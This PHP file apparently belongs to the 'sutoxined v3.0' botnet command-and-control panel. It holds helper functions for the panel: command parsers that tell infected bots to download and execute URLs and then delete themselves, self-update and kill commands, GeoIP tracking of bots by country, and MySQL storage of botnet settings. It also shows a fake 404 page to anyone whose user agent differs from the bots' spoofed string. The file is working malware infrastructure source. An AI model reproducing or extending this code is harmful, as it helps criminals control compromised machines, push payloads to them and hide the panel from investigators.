<?
	// sutoxined v3.0 command & control center
	
	/**********************************************************/
		$adelim 			= 		"#"; 
		$cdelim 			= 		""; 
	/**********************************************************/
		$exec_cmd 			= 		"exec"; 
		$cmd_prefix 		= 		"cmd";
		$upd_prefix			=		"upd";
		$set_rate			=		"rate";
		$die_cmd			=		"die"; 
	/**********************************************************/
		$country_codes 		= 		$GLOBALS[GEOIP_COUNTRY_CODES];
		$country_names 		= 		$GLOBALS[GEOIP_COUNTRY_NAMES];
	/**********************************************************/
	function ShowFlag($countrycode)	
	{
	  return '<img src="./images/drm_'.htmlspecialchars(strtolower($countrycode)).'.gif" width=18 height=12>';
	}
	/**********************************************************/
	function GetCountryInfo($ip)
	{
		$gi = geoip_open("GeoIP.dat",GEOIP_STANDARD);
		$ci['code'] = geoip_country_code_by_addr($gi, $ip);
			
		geoip_close($gi);
	
		if (strlen(trim($ci['code']))<2) 
		{
			$ci['code'] = "O1";
		}
		
		return $ci['code'];
	}
	/**********************************************************/
	function ConnectMySQL($host, $login, $password, $database)
	{
		$connect = mysql_connect($host, $login, $password);
			
		if ($connect == FALSE)
				die('cant connect to database');
				
		$selectdb = mysql_select_db($database);
			
		if ($selectdb == FALSE)
				die('cant select database'); 
	}
	/**********************************************************/
	function MessageRedirect($msg, $link)
	{
		echo "<script>";
		echo "alert(\"$msg\");";
		
		if(!is_null($link)) 
				echo "location=\"$link\";";
		
		echo "</script>";
	}
	/**********************************************************/
	function refresh_rate($act, $rate)
	{
		global $stats_url;
		if($act == "get")
		{
			$sql   = "SELECT refresh_rate FROM botnet_config LIMIT 1";
			
			$refresh_rate = intval(mysql_result(mysql_query($sql), 0));
			return $refresh_rate;
		}
		else if($act == "set" && !is_null($rate))
		{
			$sql   = "UPDATE botnet_config SET refresh_rate = '$rate'";
			
			if(mysql_query($sql))
				MessageRedirect("refresh rate is $rate now", $stats_url);
			else
				MessageRedirect("cant edit refresh rate", $stats_url);
		}
	}
	/**********************************************************/
	function bots_page_limit($act, $limit)
	{
		global $bots_url;
		if($act == "get")
		{
			$sql   = "SELECT bots_pagelimit FROM botnet_config LIMIT 1";
			
			$bots_page_limit = intval(mysql_result(mysql_query($sql), 0));
			return $bots_page_limit;
		}
		else 
		if($act == "set" && !is_null($limit))
		{
			$sql   = "UPDATE botnet_config SET bots_pagelimit = '$limit'";
			
			if(mysql_query($sql))
				MessageRedirect("bots page limit is $limit now", $bots_url);
			else
				MessageRedirect("cant edit bots page limit", $bots_url);
		}
	}
	/**********************************************************/
	function UpdParser($cmd)
	{
		global $adelim, $cdelim;
		
		$upd_str = explode($adelim, $cmd);
		if($upd_str[0] == "upd" && $upd_str[2])
		{
			$echo_upd = "update self with [".$upd_str[2]."]";
			return str_replace($cdelim, "", $echo_upd);
		}
		else 
			return "unknown upd";
	}
	/**********************************************************/
	function CmdParser($cmd)
	{
		global $adelim, $cdelim;
		$cmd_str = explode($adelim, $cmd);
		
		if($cmd_str[0] == "cmd" && $cmd_str[2] == "exec")
		{
			$echo_cmd = "exec urls [".$cmd_str[4]."]";

			if($cmd_str[3]=="1") 
			{
				$echo_cmd .= " and delete self";
			}
				return str_replace($cdelim, "", $echo_cmd);
		}
		else 
				return "unknown command";
	}
	/**********************************************************/
	function StopOldUpdates()
	{
		global $updates_url;
		$sql = "UPDATE botnet_updates SET status='0'";
		if(mysql_query($sql))
			MessageRedirect("you cant create more than 1 update task. old updates were stopped", $updates_url);
		else
			die(MessageRedirect("cant stop old updates", $updates_url));
	}
	/**********************************************************/
	function NotFound()
	{
		header("HTTP/1.0: 404 Not Found");
		$notfound = 
		"<HTML>".
		"<HEAD>".
		"<TITLE>404 Not Found</TITLE>".
		"</HEAD>".
		"<BODY>".
		"<H1>Not Found</H1>".
		"The requested document was not found on this server.".
		"<P>".
		"<HR>".
		"<ADDRESS>".
		"Web Server at ".$_SERVER['HTTP_HOST']."".
		"</ADDRESS>".
		"</BODY>".
		"</HTML>";
		echo $notfound;
	}
	/**********************************************************/
	function CheckBotUserAgent()
	{
		 $bot_user_agent	= "Mozilla/4.0 (compatible; MSlE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)";
		 if($_SERVER['HTTP_USER_AGENT'] != $bot_user_agent)
		 {
			NotFound();
			die();
		 }
	}
	/**********************************************************/
 ?>